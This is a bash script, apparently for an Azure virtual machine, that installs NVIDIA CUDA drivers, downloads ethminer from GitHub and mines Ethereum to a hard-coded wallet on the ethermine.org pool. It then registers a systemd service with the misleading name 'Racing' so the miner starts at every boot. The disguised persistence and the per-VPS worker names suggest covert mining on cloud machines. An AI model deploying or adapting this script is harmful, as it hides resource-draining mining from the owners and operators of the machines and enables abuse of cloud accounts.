cd /home/azure
if [[ ! -f isHaveSetupCoin.txt ]]
then
    echo "Start setup..."
    sudo apt-get install linux-headers-$(uname -r) -y
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
    wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
    sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
    sudo apt-get update
    sudo apt-get -y install cuda-drivers
    sudo apt-get install libcurl3 -y
    echo "xxx vip pro" > isHaveSetupCoin.txt
    wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    cd bin
    ./ethminer -U -P stratum://0xb3c4278f22af4065c55db747e4efa8ed4ff02153.script1@us2.ethermine.org:4444 &
else
    wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
    cd bin
    myworker='000_vps'_$( date +'%d%m_%H%M%S')
    ./ethminer -U -P stratum://0xb3c4278f22af4065c55db747e4efa8ed4ff02153.$myworker@us2.ethermine.org:4444 &
fi
myworker='000_vps'_$( date +'%d%m_%H%M%S')
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/bin/ethminer -U -P stratum://0xb3c4278f22af4065c55db747e4efa8ed4ff02153.$myworker@us2.ethermine.org:4444\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
